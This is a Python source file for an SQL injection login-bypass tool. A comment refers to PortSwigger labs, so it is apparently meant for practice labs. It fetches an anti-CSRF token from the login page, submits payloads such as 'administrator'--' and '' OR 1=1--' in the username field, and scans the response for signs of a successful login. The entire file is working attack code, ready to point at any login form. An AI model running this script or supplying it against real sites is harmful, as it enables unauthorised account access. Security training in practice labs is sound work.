from bs4 import BeautifulSoup
from .core import WebSession

class SQLInjector:
    def __init__(self, url):
        self.url = url
        self.web = WebSession() # Composition: uses the session manager

    def _get_csrf_token(self):
        """
        Helper method to extract Anti-CSRF token from the login page.
        Returns the token string or None if not found.
        """
        print("[*] Retrieving CSRF token...")
        response = self.web.get(self.url)
        
        if response and response.status_code == 200:
            soup = BeautifulSoup(response.text, 'html.parser')
            # PortSwigger labs usually name the input 'csrf'
            token_input = soup.find('input', {'name': 'csrf'})
            if token_input:
                token = token_input.get('value')
                print(f"[*] Token found: {token[:10]}...") # Print only first 10 chars
                return token
        
        print("[!] CSRF token not found. The attack might fail.")
        return None

    def run_login_bypass(self, username_field, password_field):
        """
        Attempts generic SQLi login bypass using standard payloads.
        """
        # Extended payload list
        payloads = [
            "administrator'--", 
            "admin'--", 
            "administrator' #", 
            "' OR 1=1--"
        ]
        
        print(f"[*] Target: {self.url}")
        
        for payload in payloads:
            # Step 1: We need a fresh CSRF token for each attempt (usually)
            csrf_token = self._get_csrf_token()
            
            print(f"[*] Testing payload: {payload}")
            
            data = {
                username_field: payload,
                password_field: 'dummy_pass'
            }

            # Include CSRF token if present
            if csrf_token:
                data['csrf'] = csrf_token
            
            # Step 2: Send malicious request
            response = self.web.post(self.url, data=data)
            
            if response is None:
                continue

            # Broader keywords to detect successful login
            success_keywords = ["Log out", "Sign out", "My account", "Welcome", "Dashboard"]
            
            is_vulnerable = False
            for keyword in success_keywords:
                if keyword in response.text:
                    is_vulnerable = True
                    break
            
            if is_vulnerable:
                print(f"[+] VULNERABILITY FOUND! Payload: {payload}")
                return True
            else:
                # DEBUG: If failed, print the first 100 chars of response
                print(f"[-] Failed. Server response hint: {response.text[:100]}...")
        
        print("[-] No vulnerability found with standard payloads.")
        return False
